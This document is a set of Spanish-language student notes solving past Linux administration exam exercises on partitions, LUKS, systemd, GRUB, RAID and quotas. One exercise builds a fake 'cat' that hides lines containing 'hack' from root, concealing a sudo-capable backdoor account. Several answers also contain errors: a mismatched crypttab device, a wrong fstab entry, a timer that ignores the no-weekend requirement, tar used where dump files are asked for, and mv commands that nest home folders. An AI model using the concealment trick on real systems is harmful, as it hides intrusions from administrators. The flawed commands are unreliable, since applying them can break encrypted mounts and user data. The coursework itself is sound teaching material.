SCRIPTS Y EXAMENES PASADOS

# Ordinaria 2023

## Ejercicio 1 TEMAS: Usuarios, particiones
La política de reparto de recursos en tu empresa impone los siguiente 
condicionantes: 
- El directorio $HOME de los usuarios no debe alojarse en el mismo disco que el sistema de ficheros raíz. 
- Todos los usuarios deben disponer de una partición propia de aproximadamente el mismo tamaño, aprovechando todo el espacio disponible. 
- El usuario user1 maneja información delicada, por lo que su partición se protegerá con una encriptación de tipo LUKS.  
- En cada partición debe existir un sistema de ficheros de tipo ext4 que actuará como $HOME de cada usuario. 
Implementa la política descrita en tu máquina, haciendo las modificaciones pertinentes para que los usuarios cumplan los requisitos. No se debe perder el contenido previo de los usuarios, el cambio implementado debe ser transparente para ellos. No puedes emplear discos adicionales.

1. Crearemos las particiones para cada usuario. Pero primero verificaremos el espacio en el disco con `sudo fdisk -l /dev/sda`.
Antes de crear particiones debemos desmontar el punto de montaje en el que vayamos a hacer las operaciones.
Después crearemos las particiones con gdisk(Si son gpt, sin son MBR, fdisk), por ejemplo ` sudo gdisk /dev/sda2`. Con esto entramos en el menú y podemos crear las particiones. Ojo, no podemos hacerlo en la particion en la que está montado el sistema de ficheros raíz.
una vez creadas las particiones las formateamos a ext4 con `mkfs`.
Para hacer lo de LUKS tenemos que tener instalado cryptsetup.
`sudo apt-get install cryptsetup`.
Suponiendo que el usuario a encriptar tenga su particion en sda4:
```bash
sudo cryptsetup luksFormat /dev/sda4
sudo cryptsetup luksOpen /dev/sda4 user1_crypt
sudo mkfs.ext4 /dev/mapper/user1_crypt
```
Ahora (suponiendo que solo tenemos dos usuarios). Tendremos que montar sus particiones en un punto temporal:
```bash
sudo mkdir /mnt/user1 /mnt/user2
sudo mount /dev/mapper/user1_crypt /mnt/user1
sudo mount /dev/sda3 /mnt/user2
```
Copia los datos de los usuarios a las nuevas particiones usando rsync para preservar permisos y enlaces:
```bash
sudo rsync -a /home/user1/ /mnt/user1/
sudo rsync -a /home/user2/ /mnt/user2/
```
Actualizar fstab para montar las particiones automáticamente al inicio:
Edita /etc/fstab para añadir las entradas de las nuevas particiones.
Añade una entrada para user1 con LUKS:
```bash
echo 'user1_crypt /home/user1 ext4 defaults 0 2' | sudo tee -a /etc/fstab
```
Añade una entrada para user2 (suponiendo que es /dev/sda3):
```bash
echo '/dev/sda3 /home/user2 ext4 defaults 0 2' | sudo tee -a /etc/fstab
```
Configurar el sistema para que cryptsetup pida la clave al inicio:
Edita /etc/crypttab para añadir la entrada para user1:
```bash
echo 'user1_crypt /dev/sda2 none luks' | sudo tee -a /etc/crypttab
```

Por último tenemos que cambiar los puntos de anclaje de los usuarios.
```bash
sudo umount /mnt/user1
sudo umount /mnt/user2
sudo mount /home/user1
sudo mount /home/user2
```
Ahora si hicimos todo bien, al reiniciar deberia estar correcto.

## Ejercicio 2 TEMAS: Usuarios
Un usuario no puede acceder a su directorio de trabajo, solucionalo. 
Debemos encontrar el fallo. Posibilidades:
### 1. Permisos de Directorio

#### Problema:
Los permisos del directorio de trabajo de `user2` pueden estar configurados incorrectamente, impidiendo el acceso.

#### Solución:
Verifica y corrige los permisos:
```sh
sudo ls -ld /home/user2
sudo chmod 700 /home/user2
```

### 2. Propiedad del Directorio

#### Problema:
El directorio de trabajo puede no pertenecer a `user2`.

#### Solución:
Verifica y corrige la propiedad del directorio:
```sh
sudo chown user2:user2 /home/user2
```

### 3. Montaje del Directorio

#### Problema:
El directorio de trabajo de `user2` puede estar en una partición que no se ha montado correctamente.

#### Solución:
Verifica el archivo `/etc/fstab` y monta la partición si es necesario:
```sh
sudo mount -a
sudo mount /home/user2
```

### 4. Sistema de Archivos Corrupto

#### Problema:
El sistema de archivos de la partición que contiene el directorio de `user2` puede estar corrupto.

#### Solución:
Verifica y repara el sistema de archivos:
```sh
sudo umount /dev/sdaX    # Sustituir /dev/sdaX por la partición correspondiente
sudo fsck /dev/sdaX
sudo mount /dev/sdaX /home/user2
```

### 5. Cuota de Disco

#### Problema:
`user2` puede haber excedido su cuota de disco.

#### Solución:
Verifica la cuota de disco y ajusta si es necesario:
```sh
sudo repquota -a
sudo edquota -u user2
```

### 6. Perfil del Usuario

#### Problema:
El archivo de perfil del usuario (`.bashrc`, `.profile`, etc.) puede estar configurado incorrectamente o corrupto.

#### Solución:
Revisa y restaura los archivos de perfil desde una copia de seguridad o crea uno nuevo:
```sh
sudo mv /home/user2/.bashrc /home/user2/.bashrc.backup
sudo cp /etc/skel/.bashrc /home/user2/
sudo chown user2:user2 /home/user2/.bashrc
```

### 7. Configuración del Usuario en `/etc/passwd`

#### Problema:
La configuración del directorio de inicio de `user2` en `/etc/passwd` puede ser incorrecta.

#### Solución:
Verifica y corrige la configuración:
```sh
grep user2 /etc/passwd
# Debería verse algo como: user2:x:1001:1001::/home/user2:/bin/bash
sudo usermod -d /home/user2 user2
```

### 8. Restricciones de SELinux o AppArmor

#### Problema:
SELinux o AppArmor pueden estar aplicando restricciones que impiden el acceso.

#### Solución:
Verifica los logs de SELinux/AppArmor y ajusta las políticas si es necesario:
```sh
sudo ausearch -m avc -ts recent
sudo audit2allow -w -a
# Para AppArmor:
sudo aa-status
```

### 9. Problemas de Red o Montaje NFS (si aplica)

#### Problema:
Si el directorio de inicio está en un recurso NFS, puede haber problemas de red o montaje NFS.

#### Solución:
Verifica la conectividad de red y el estado del servicio NFS:
```sh
sudo systemctl status nfs-client.target
sudo showmount -e server_address   # Sustituir server_address por la dirección del servidor NFS
```

### 10. Bloqueo de Cuenta

#### Problema:
La cuenta de `user2` puede estar bloqueada.

#### Solución:
Verifica y desbloquea la cuenta:
```sh
sudo passwd -S user2
sudo passwd -u user2
```

### Pasos de Diagnóstico Detallados

1. **Verifica la propiedad y los permisos del directorio de inicio**:
   ```sh
   sudo ls -ld /home/user2
   ```

2. **Verifica la entrada en `/etc/passwd`**:
   ```sh
   grep user2 /etc/passwd
   ```

3. **Verifica si hay cuotas excedidas**:
   ```sh
   sudo repquota -a
   ```

4. **Verifica si hay mensajes relevantes en los logs del sistema**:
   ```sh
   sudo tail -n 100 /var/log/syslog
   sudo tail -n 100 /var/log/auth.log
   ```

5. **Prueba a cambiar de usuario e intentar acceder al directorio de inicio**:
   ```sh
   su - user2
   ```

6. **Verifica y monta todas las particiones**:
   ```sh
   sudo mount -a
   ```

## Ejercicio 3 TEMAS: Usuarios, instalacion de sw
Si el usuario `user3` tiene permisos sudo para instalar paquetes pero está experimentando problemas para hacerlo, hay varias posibilidades que podrían estar causando este problema. Aquí hay algunos pasos que podemos seguir para resolverlo:

### 1. Verificar los permisos sudo de user3

1. **Verificar la configuración de sudo**:
   ```sh
   sudo cat /etc/sudoers | grep user3
   ```

   Esto verificará si `user3` tiene los permisos adecuados en el archivo `sudoers`.

2. **Verificar el registro de autenticación de sudo**:
   ```sh
   sudo grep user3 /var/log/auth.log
   ```

   Esto te dará información sobre si `user3` ha intentado utilizar los privilegios de sudo recientemente.

### 2. Verificar la disponibilidad del comando `sudo`

1. **Verificar la ubicación de `sudo`**:
   ```sh
   which sudo
   ```

   Esto debería mostrarte la ubicación del comando `sudo`. Si no se muestra nada, puede haber un problema con la configuración de `sudo` en tu sistema.

### 3. Intentar instalar un paquete como user3

1. **Intentar instalar un paquete como user3**:
   ```sh
   sudo apt-get install calendar
   ```

   Esto intentará instalar el paquete `calendar` utilizando los privilegios de sudo del usuario `user3`. Si hay algún problema, deberías recibir un mensaje de error que puede proporcionar información sobre la causa del problema.

### 4. Verificar el registro de instalación de paquetes

1. **Verificar los registros de instalación de paquetes**:
   ```sh
   tail -n 50 /var/log/dpkg.log
   ```

   Esto te dará información sobre cualquier problema que pueda haber ocurrido durante la instalación de paquetes reciente.

### 5. Reiniciar el sistema

A veces, simplemente reiniciar el sistema puede resolver problemas que no son evidentes de otra manera:
```sh
sudo reboot
```

### 6. Verificar el espacio en disco

Si hay espacio insuficiente en disco, puede impedir la instalación de nuevos paquetes:
```sh
df -h
```

### 7. Verificar problemas de red

Si el sistema necesita descargar paquetes desde internet, problemas de red pueden causar fallas en la instalación. Verifica la conectividad de red:
```sh
ping google.com
```

### 8. Verificar problemas de repositorio

Si los paquetes no se pueden descargar de los repositorios, puede haber un problema con la configuración de los repositorios. Verifica los archivos de configuración de los repositorios en `/etc/apt/sources.list` y `/etc/apt/sources.list.d/`.

### 9. Verificar si hay bloqueos de apt

Si hay procesos de apt en ejecución, pueden bloquear la instalación de nuevos paquetes:
```sh
ps aux | grep apt
```

### 10. Verificar mensajes de error

Si recibes algún mensaje de error específico durante el intento de instalación de paquetes, busca en línea para encontrar posibles soluciones basadas en ese mensaje de error específico.

## Ejercicio 4 TEMAS: Usuarios, backups, scripts, system units
 El usuario user4 ha borrado de forma accidental un fichero de nombre critical.txt. Recupera dicho documento a través de los ficheros de backup (ficheros con extensión .dump). A través de systemd implementa una política de backup para el sistema de ficheros en el que se ubica el directorio $HOME del usuario en la que todos los días se realice un backup de nivel 1 a las 12:00 de la noche (excepto fines de semana), cuyo nombre tenga el formato [AÑO]-[MES]-[DÍA]_l1.dump. Dicho backup se almacena en la carpeta donde se encuentran los backups previos. 

El archivo perido estará en algún lugar donde se guarden los .dump.
puedes encontrarlos con `sudo find / -name "*.dump" -type f`.
Luego:
```sh
sudo cp /ruta/a/los/respaldos/backup_2024-05-30_l1.dump /ruta/a/la/carpeta/de/user4/
```

 Para hacer que home guarde backups crearemos un scipt (luego dale permisos).
 ```sh
 #!/bin/bash

# Directorio de respaldos
backup_dir="/ruta/a/los/respaldos"

# Directorio del sistema de archivos del usuario user4
user_home_dir="/home/user4"

# Nombre del archivo de respaldo con formato [AÑO]-[MES]-[DÍA]_l1.dump
backup_file="$backup_dir/$(date +'%Y-%m-%d')_l1.dump"

# Realizar el respaldo de nivel 1
sudo tar -cvf $backup_file --listed-incremental=$backup_dir/incremental_snapshot.snar $user_home_dir
```
Y después crearemos una unidad de servicio que lo utilice
Crea un archivo llamado `backup_service.service` en `/etc/systemd/system/` con el siguiente contenido:
```sh
[Unit]
Description=Backup Service for User4
After=network.target

[Service]
Type=oneshot
ExecStart=/ruta/al/script/backup_script.sh
```
Definir temporizador systemd para el respaldo diario:
Crea un archivo llamado `backup_timer.timer` en `/etc/systemd/system/` con el siguiente contenido:
```sh
[Unit]
Description=Backup Timer for Daily Backup
Requires=backup_service.service

[Timer]
OnCalendar=*-*-* 00:00:00
Persistent=true

[Install]
WantedBy=timers.target
```
Por ultimo acticaremos e iniciaremos el temporizador con systemctl:
```sh
sudo systemctl daemon-reload
sudo systemctl enable backup_timer.timer
sudo systemctl start backup_timer.timer
```

## Ejercicio 5 TEMAS: Usuarios, particiones
La política de gestión de usuarios de tu empresa ha cambiado, imponiendo ahora los siguiente condicionantes: 
- Todos los directorios de trabajo de los usuarios se ubicarán en un volumen lógico que se extiende a todos los discos disponibles (excepto el disco donde reside el sistema de ficheros raíz). Particiona dichos discos si fuera necesario. 
- El reparto de recursos se hace a través de cuotas, en las que el usuario2 dispone del 50% del espacio de almacenamiento y el resto de usuario se reparten el restante de manera lo más equitativa posible. Implementa la política descrita en tu máquina, haciendo las modificaciones pertinentes para que los usuarios cumplan los requisitos. No puedes emplear discos adicionales, trabaja con lo que tienes. 

### 1. Creación de un volumen lógico

1. **Identificar los discos disponibles**:
   - Usa el comando `lsblk` para ver los discos disponibles y sus tamaños.

2. **Particionar los discos si es necesario**:
   - Si los discos no están particionados, usa `fdisk` o `gdisk` para crear particiones en ellos.

3. **Crear un volumen lógico**:
   - Utiliza `lvm` para crear un grupo de volúmenes y un volumen lógico que se extienda a todos los discos disponibles, excepto el disco del sistema de archivos raíz.

   ```sh
   # Crear un nuevo grupo de volúmenes
   sudo vgcreate nombre_del_grupo_de_volúmenes /dev/sdX /dev/sdY

   # Crear un volumen lógico que se extienda a todos los discos disponibles excepto el raíz
   sudo lvcreate -l 100%FREE -n lv_users nombre_del_grupo_de_volúmenes
   ```

### 2. Movimiento de directorios de trabajo de usuarios

1. **Crear directorios de trabajo para los usuarios**:
   - Creamos los directorios de trabajo para los usuarios en el nuevo volumen lógico.

   ```sh
   sudo mkdir /mnt/lv_users/user1
   sudo mkdir /mnt/lv_users/user2
   sudo mkdir /mnt/lv_users/user3
   sudo mkdir /mnt/lv_users/user4
   # Y así sucesivamente para todos los usuarios
   ```

2. **Mover los directorios de trabajo existentes**:
   - Movemos los directorios de trabajo de los usuarios existentes al nuevo volumen lógico.

   ```sh
   sudo mv /home/user1 /mnt/lv_users/user1
   sudo mv /home/user2 /mnt/lv_users/user2
   sudo mv /home/user3 /mnt/lv_users/user3
   sudo mv /home/user4 /mnt/lv_users/user4
   # Y así sucesivamente para todos los usuarios
   ```

### 3. Configuración de cuotas de disco

1. **Instalar herramientas de cuotas (si no están instaladas)**:

   ```sh
   sudo apt-get install quota
   ```

2. **Habilitar cuotas en el sistema de archivos del volumen lógico**:
   - Edita el archivo `/etc/fstab` para agregar la opción `usrquota,grpquota` al montar el volumen lógico.
   - Ejemplo de entrada en `/etc/fstab`:

     ```
     /dev/nombre_del_grupo_de_volúmenes/lv_users  /mnt/lv_users  ext4  defaults,usrquota,grpquota  0  2
     ```

3. **Remontar el volumen lógico**:

   ```sh
   sudo mount -o remount /mnt/lv_users
   ```

4. **Configurar cuotas de disco para los usuarios**:

   ```sh
   # Habilitar cuotas para el sistema de archivos
   sudo quotacheck -cug /mnt/lv_users
   sudo quotaon /mnt/lv_users

   # Establecer cuotas para el usuario2 (50% del espacio)
   sudo edquota -u user2
   # Establecer cuotas equitativas para los demás usuarios
   ```

Con estos pasos, has implementado la nueva política de gestión de usuarios en tu empresa, asegurando que los directorios de trabajo de los usuarios se ubiquen en un volumen lógico que se extienda a todos los discos disponibles (excepto el disco raíz del sistema de archivos) y que el reparto de recursos se realice mediante cuotas de disco según los porcentajes especificados.

# Ordinaria 21-22

## Ejercicio 1 TEMAS: scripts, system units, comandos "hack"
Arranca la máquina desde el snapshot Ej1Begin. En dicha máquina comprobarás que hay un usuario de nombre “hacker” que tiene permisos completos a través de sudo. Queremos que sea un usuario “oculto” para el administrador, y como primer paso vamos a “crear” algunos comandos a medida. Crea un Shell script de nombre cat que realice las mismas tareas que el comando original (asumimos que recibe un fichero como único parámetro), con la única excepción de que las líneas que contienen el string “hack” no se imprimen por pantalla (así no se detectará su presencia en ficheros como /etc/passwd, /etc/shadow, etc.). Una vez finalizado, lleva a cabo las acciones necesarias para que el usuario root utilice tu script siempre que tenga intención de ejecutar el comando cat. El resto de usuario usarán el comando cat original del sistema. 

Primero crearemos el script llamado **cat**.
Con la opcion `-v` de `grep` hacemos que se muestren todas las lineas menos las que tengan la palabra indicada.

```bash
#!/bin/bash
grep -v "hack" "$1"
```

Lo guardamos en el directorio `usr/local/bin` que es accesible por root y le damos permisos.
`sudo chmod +x /usr/local/bin/cat`.

Ahora, cómo hacemos que se ejecute este en vez de cat original?
Tenemos que modificar el PATH de root.
Entramos en su .bashrc y cambiamos la linea que hace export PATH.

```sh
sudo nano /root/.bashrc

export PATH=/usr/local/bin:$PATH
```
Esto hará que se ejecute el cat creado por nosotros en vez del original.

## Ejercicio 2
 Vamos a crear un servicio de usuarios “volátiles”. Dicho servicio, de nombre volatile-user.service, será de tipo oneshot e incluirá la directiva “RemainAfterExit=yes”. Su función será crear un usuario con las especificaciones indicadas a continuación cuando se arranque la máquina. Cuando se apague la máquina, el mismo servicio se encargará de eliminar COMPLETAMENTE al usuario creado. El servicio se debe iniciar en el modo de operación multiuser y se debe ejecutar antes que los servicios de acceso (systemd-logind.service y sshd.service). Los parámetros de configuración del usuario serán los siguientes:  username=tmpuser, password=temporal, UID=10000, GID=100, Shell tipo bash, directorio home: /home/tmpuser.Crea el servicio y comprueba su correcto funcionamiento. Anota en /root/README.txt como has hecho las comprobaciones. 


Primero creamos el script asociado al servicio (y le damos permisos (`sudo chmod +x /usr/local/bin/manage_tmpuser.sh`)):
```sh
#!/bin/bash
# switch para decidir que hacer en caso de start o stop
case "$1" in
    start)
        # Crear el usuario
        useradd -m -d /home/tmpuser -s /bin/bash -u 10000 -g 100 tmpuser
        echo "tmpuser:temporal" | chpasswd
        ;;
    stop)
        # Eliminar el usuario y su directorio home
        userdel -r tmpuser
        ;;
    *)
        echo "Usage: $0 {start|stop}"
        exit 1
        ;;
esac
```
Ahora creamos el servicio `volatile-user.service` en `/etc/systemd/system/`que usa este script de acuerdo a las especificaciones dadas.
```sh
[Unit]
Description=Volatile User Service
After=network.target
Before=systemd-logind.service sshd.service
ConditionPathExists=!/etc/nologin

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/usr/local/bin/manage_tmpuser.sh start
ExecStop=/usr/local/bin/manage_tmpuser.sh stop

[Install]
WantedBy=multi-user.target
```


Explicación del archivo volatile-user.service:

[Unit]
- Description=Volatile User Service:
  Proporciona una breve descripción del servicio. Este texto se muestra cuando se visualiza el estado del servicio o se listan los servicios disponibles.
  
- After=network.target:
  Indica que este servicio debe iniciarse después de que la red esté configurada y lista. network.target es un objetivo genérico que representa la configuración de red.
  
- Before=systemd-logind.service sshd.service:
  Indica que este servicio debe iniciarse antes de los servicios systemd-logind.service (el servicio de login de systemd) y sshd.service (el servidor SSH). Esto asegura que el usuario tmpuser esté creado antes de que se permitan inicios de sesión.
  
- ConditionPathExists=!/etc/nologin:
  Este servicio no se ejecutará si el archivo /etc/nologin existe. Este archivo generalmente se usa para deshabilitar el inicio de sesión en el sistema, por lo que este servicio no debería ejecutarse en esas condiciones.

[Service]
- Type=oneshot:
  Indica que el servicio realiza una acción corta y luego finaliza. No es un servicio que se ejecute continuamente en segundo plano.
  
- RemainAfterExit=yes:
  Asegura que el servicio se considere activo incluso después de que el proceso especificado en ExecStart haya finalizado. Esto es importante porque queremos que ExecStop se ejecute al detener o apagar el servicio.
  
- ExecStart=/usr/local/bin/manage_tmpuser.sh start:
  Especifica el comando que se ejecutará cuando se inicie el servicio. En este caso, ejecuta el script con el argumento start, lo que crea el usuario tmpuser.
  
- ExecStop=/usr/local/bin/manage_tmpuser.sh stop:
  Especifica el comando que se ejecutará cuando se detenga el servicio. En este caso, ejecuta el script con el argumento stop, lo que elimina el usuario tmpuser.

[Install]
- WantedBy=multi-user.target:
  Indica que este servicio se activará cuando el sistema entre en el estado multi-user.target, que es un estado típico de operación multiusuario con servicios de red activos, pero sin entorno gráfico. Esto asegura que el servicio se ejecute en el modo de operación multiusuario.

Resumen del Funcionamiento
1. Al iniciar el servicio:
   - El script manage_tmpuser.sh start se ejecuta, creando el usuario tmpuser con las especificaciones dadas (UID, GID, shell, etc.).

2. Durante la operación normal del sistema:
   - El servicio se considera activo debido a RemainAfterExit=yes, aunque el script haya finalizado.

3. Al detener el servicio (por ejemplo, al apagar el sistema):
   - El script manage_tmpuser.sh stop se ejecuta, eliminando completamente al usuario tmpuser.

Esta configuración asegura que el usuario tmpuser exista solo durante la operación normal del sistema y sea eliminado automáticamente al detener el servicio, manteniendo así la seguridad y limpieza del sistema.

Ahora deberemos habilitar y probar el servicio

Habilita el servicio para que se inicie automáticamente en el arranque:
```sh
sudo systemctl enable volatile-user.service
```

Inicia el servicio manualmente para probar su funcionamiento:
```sh
sudo systemctl start volatile-user.service
```
Verifica que el usuario tmpuser ha sido creado:
```sh
getent passwd tmpuser
# Deberías ver una línea similar a:
# tmpuser:x:10000:100::/home/tmpuser:/bin/bash
```

Verifica que el usuario puede autenticarse con la contraseña temporal:
```sh
su - tmpuser
# Introduce la contraseña "temporal" para acceder al shell del usuario tmpuser
```

Ahora verificaremos que el usuario se elimine al apagar la maquina (con detener el servicio serviría).
```sh
sudo systemctl stop volatile-user.service

getent passwd tmpuser
# No deberías ver ninguna salida
```
Y ahora escribiriamos los pasos realizados en el readme:
```md
# Comprobaciones para el servicio volatile-user.service

1. Habilitar el servicio:
   sudo systemctl enable volatile-user.service

2. Iniciar el servicio manualmente para probar:
   sudo systemctl start volatile-user.service

3. Verificar que el usuario tmpuser ha sido creado:
   getent passwd tmpuser

4. Verificar que el usuario puede autenticarse:
   su - tmpuser
   # Contraseña: temporal

5. Detener el servicio para eliminar el usuario:
   sudo systemctl stop volatile-user.service

6. Verificar que el usuario ha sido eliminado:
   getent passwd tmpuser
```


## Ejercicio 3 TEMAS: arranque, particiones, RAIDS
 Arranca la máquina desde el snapshot Ej3Begin. Estás trabajando con un sistema Debian que dispone de un disco adicional en el que se ha creado una partición e instalado el sistema de ficheros raíz de una distribución alternativa de Linux (Lubuntu). Para gestionar el uso de ambos sistemas, lleva a cabo las siguientes tareas: 
1. Crea una nueva entrada en el BootLoader del sistema Debian que te permita arrancar la distribución Lubuntu. Limita el contenido de dicha entrada a los elementos estrictamente necesarios (kernel, ramdisk y sistema de ficheros raíz). La nueva entrada será la que arranque por defecto de forma permanente. 
2. Hemos extraviado el password de root del sistema Lubuntu. Lleva a cabo las tareas necesarias para que dicho password sea el mismo que el de la distribución ebian. 
3. Lleva a cabo las tareas pertinentes para unificar los directorios de trabajo (directorios $HOME) de los usuarios de ambos sistemas operativos, de tal forma que independientemente del sistema que se arranque el contenido sea el mismo siempre. Para realizar tus comprobaciones puedes trabajar con el usuario jalberto (password: jalberto). 

### Tarea 1
Primero montamos la partición de Lubuntu y obtenemos el kernel y ramdisk. (Anota los nombres del kernel (por ejemplo, vmlinuz-x.x.x-xx-generic) y el ramdisk (por ejemplo, initrd.img-x.x.x-xx-generic).)
```sh
sudo mount /dev/sdb1 /mnt
sudo ls /mnt/boot
```
Creamos una entrada en el GRUB
```sh
sudo nano /etc/grub.d/40_custom
# Escribimos:
menuentry "Lubuntu" {
    set root=(hd1,1)
    linux /boot/vmlinuz-x.x.x-xx-generic root=/dev/sdb1 ro quiet
    initrd /boot/initrd.img-x.x.x-xx-generic
}
```
IMPORTANTE: ACTUALIZAMOS EL GRUB `sudo update-grub`.
Configuramos Lubuntu como la entrada por defecto:
```sh
sudo nano /etc/default/grub
# buscamos la linea: GRUB_DEFAULT=0
# La remplazamos por:
GRUB_DEFAULT="Lubuntu"
``` 
Y volvemos a actualizar el GRUB `sudo update-grub`.

### Tarea 2
Recuperar la contraseña de root
 Primero montamos las particiones:
 ```sh 
sudo mount /dev/sdb1 /mnt
sudo mount --bind /dev /mnt/dev
sudo mount --bind /proc /mnt/proc
sudo mount --bind /sys /mnt/sys
 ```
Entramos en el sistema lubuntu con chroot y cambiamos la contraseña:
```bash
sudo chroot /mnt
passwd root
```
Y por ultimo salimos de chroot y desmontamos las particiones
```sh
exit
sudo umount /mnt/dev
sudo umount /mnt/proc
sudo umount /mnt/sys
sudo umount /mnt
```

### Tarea 3
Unificar los directorios de trabajo

1. **Montar el directorio home de Lubuntu en el directorio home de Debian**:
    Primero, asegúrate de que ambos sistemas tengan el mismo usuario `jalberto`.

    **Montar manualmente**:
    ```bash
    sudo mount /dev/sdb1 /mnt
    ```

    Luego, monta el directorio `/home` de Lubuntu en el directorio `/home` de Debian:
    ```bash
    sudo mount --bind /mnt/home /home
    ```

    **Hacer la montura persistente**:
    Edita el archivo `/etc/fstab`:
    ```bash
    sudo nano /etc/fstab
    ```

    Agrega la siguiente línea para hacer que el montaje sea permanente:
    ```bash
    /mnt/home   /home   none    bind    0   0
    ```

2. **Verificar que el usuario jalberto puede acceder a su directorio home en ambos sistemas**:
    Inicia sesión en Debian:
    ```bash
    su - jalberto
    # Verifica que el directorio home es el correcto y contiene los archivos esperados.
    ```

    Reinicia el sistema y selecciona Lubuntu desde el menú GRUB:
    ```bash
    # Inicia sesión en Lubuntu como jalberto y verifica el acceso a los archivos.
    ```

Con estos pasos, habrás unificado los directorios de trabajo de los usuarios en ambos sistemas.

## Ejercicio 4

### Paso 1: Particionar los discos

1. **Identificar los discos**:
    Utiliza `lsblk` o `fdisk -l` para identificar los discos disponibles. Supongamos que los discos son `/dev/sdb`, `/dev/sdc`, y `/dev/sdd`.

2. **Particionar los discos**:
    Para cada disco, crea una única partición que ocupe el 100% del disco.

    ```bash
    sudo fdisk /dev/sdb
    # Comandos dentro de fdisk:
    # n -> nueva partición
    # p -> partición primaria
    # 1 -> número de partición
    # enter -> usar el valor por defecto para el primer sector
    # enter -> usar el valor por defecto para el último sector
    # w -> escribir los cambios

    sudo fdisk /dev/sdc
    sudo fdisk /dev/sdd
    ```

### Paso 2: Crear el RAID

1. **Instalar mdadm si no está instalado**:
    ```bash
    sudo apt-get install mdadm
    ```

2. **Crear el RAID 5**:
    ```bash
    sudo mdadm --create --verbose /dev/md0 --level=5 --raid-devices=3 /dev/sdb1 /dev/sdc1 /dev/sdd1
    ```

3. **Verificar el estado del RAID**:
    ```bash
    cat /proc/mdstat
    ```

### Paso 3: Crear el sistema de archivos

1. **Crear el sistema de archivos en el dispositivo RAID**:
    ```bash
    sudo mkfs.ext4 /dev/md0
    ```

### Paso 4: Montar el RAID y mover /home

1. **Crear el punto de montaje**:
    ```bash
    sudo mkdir /mnt/raid_home
    ```

2. **Montar el dispositivo RAID**:
    ```bash
    sudo mount /dev/md0 /mnt/raid_home
    ```

3. **Copiar el contenido de /home al RAID**:
    ```bash
    sudo rsync -av /home/ /mnt/raid_home/
    ```

4. **Montar el RAID como /home permanentemente**:
    Edita el archivo `/etc/fstab`:
    ```bash
    sudo nano /etc/fstab
    ```

    Agrega la siguiente línea:
    ```bash
    /dev/md0    /home   ext4    defaults    0   2
    ```

5. **Montar el sistema de archivos**:
    ```bash
    sudo umount /home
    sudo mount -a
    ```

### Paso 5: Activar y configurar cuotas de disco

1. **Instalar cuotas si no están instaladas**:
    ```bash
    sudo apt-get install quota
    ```

2. **Activar cuotas en el archivo /etc/fstab**:
    Edita el archivo `/etc/fstab` y modifica la línea para `/home`:
    ```bash
    /dev/md0    /home   ext4    defaults,usrquota,grpquota    0   2
    ```

3. **Remontar el sistema de archivos**:
    ```bash
    sudo mount -o remount /home
    ```

4. **Crear archivos de cuotas**:
    ```bash
    sudo quotacheck -cum /home
    sudo quotaon /home
    ```

5. **Establecer cuotas para usuarios**:
    ```bash
    sudo edquota -u ltorvalds
    sudo edquota -u rstallman
    ```

    En el editor que se abre, establece los límites de espacio a 100MB y el número máximo de archivos a 100.

### Paso 6: Comprobación

1. **Verificar que las cuotas están activas**:
    ```bash
    sudo repquota -a
    ```

2. **Comprobar que los usuarios tienen los límites establecidos**:
    Inicia sesión como `ltorvalds` y `rstallman` e intenta crear archivos hasta alcanzar los límites establecidos.

Con estos pasos, habrás configurado un RAID 5, movido el directorio `/home` al RAID, activado las cuotas de disco, y establecido límites para los usuarios `ltorvalds` y `rstall


## Ejercicio 5 TEMAS: instalación de sw

### Lleva a cabo las reparaciones necesarias para instalar, mediante el comando apt, el paquete pacman4console

La instalación de un paquete mediante `apt` podría fallar por varios motivos. Aquí tienes una lista de posibles problemas y sus soluciones para el paquete `pacman4console`:

1. **Paquete no disponible en los repositorios configurados**:
   - **Motivo**: El paquete `pacman4console` puede no estar presente en los repositorios configurados en tu sistema.
   - **Solución**: Verifica que tienes los repositorios correctos configurados en `/etc/apt/sources.list` y en los archivos dentro de `/etc/apt/sources.list.d/`.
   - **Comandos**:
     ```bash
     sudo apt update
     sudo apt search pacman4console
     ```

   Si el paquete no aparece, agrega repositorios adicionales que puedan contener el paquete. Por ejemplo, puedes agregar un repositorio de Debian Universe si no está habilitado:
   ```bash
   sudo add-apt-repository universe
   sudo apt update
   ```

2. **Sistema no actualizado**:
   - **Motivo**: Puede haber dependencias rotas o desactualizadas en tu sistema.
   - **Solución**: Actualiza la lista de paquetes y el sistema.
   - **Comandos**:
     ```bash
     sudo apt update
     sudo apt upgrade
     ```

3. **Dependencias faltantes**:
   - **Motivo**: El paquete puede depender de otros paquetes que no están instalados.
   - **Solución**: Usa `apt` para instalar las dependencias automáticamente.
   - **Comandos**:
     ```bash
     sudo apt install -f
     ```

4. **Errores de red**:
   - **Motivo**: Problemas con la conexión a Internet o los servidores de los repositorios.
   - **Solución**: Verifica tu conexión a Internet y asegúrate de que los servidores de los repositorios estén accesibles.
   - **Comandos**:
     ```bash
     ping google.com
     sudo apt update
     ```

5. **Paquetes retenidos o bloqueados**:
   - **Motivo**: Algunos paquetes podrían estar bloqueados y no permitirse su actualización o instalación.
   - **Solución**: Verifica y desbloquea cualquier paquete retenido.
   - **Comandos**:
     ```bash
     sudo apt-mark showhold
     sudo apt-mark unhold <package>
     ```

6. **Espacio en disco insuficiente**:
   - **Motivo**: El sistema puede no tener suficiente espacio en disco para descargar o instalar los paquetes.
   - **Solución**: Verifica el espacio disponible en disco y libera espacio si es necesario.
   - **Comandos**:
     ```bash
     df -h
     sudo apt clean
     sudo apt autoremove
     ```

### Solución Propuesta

Sigue estos pasos para solucionar posibles problemas y luego intenta instalar el paquete `pacman4console` nuevamente:

1. **Actualizar el sistema y los repositorios**:
   ```bash
   sudo apt update
   sudo apt upgrade
   ```

2. **Buscar el paquete en los repositorios disponibles**:
   ```bash
   sudo apt search pacman4console
   ```

3. **Agregar repositorios adicionales si es necesario**:
   ```bash
   sudo add-apt-repository universe
   sudo apt update
   ```

4. **Instalar el paquete**:
   ```bash
   sudo apt install pacman4console
   ```

5. **Resolver dependencias faltantes**:
   ```bash
   sudo apt install -f
   ```

6. **Verificar y liberar espacio en disco**:
   ```bash
   df -h
   sudo apt clean
   sudo apt autoremove
   ```

Si después de seguir estos pasos aún no puedes instalar el paquete, considera buscar más información específica sobre `pacman4console` en la documentación de tu distribución o en foros en línea.

# Extraordinaria 21-22

## Ejercicio 1 TEMAS: arranque
Lleva a cabo las acciones necesarias para que nuestro sistema arranque el kernel directamente, sin hacer uso de ningún Bootloader. 

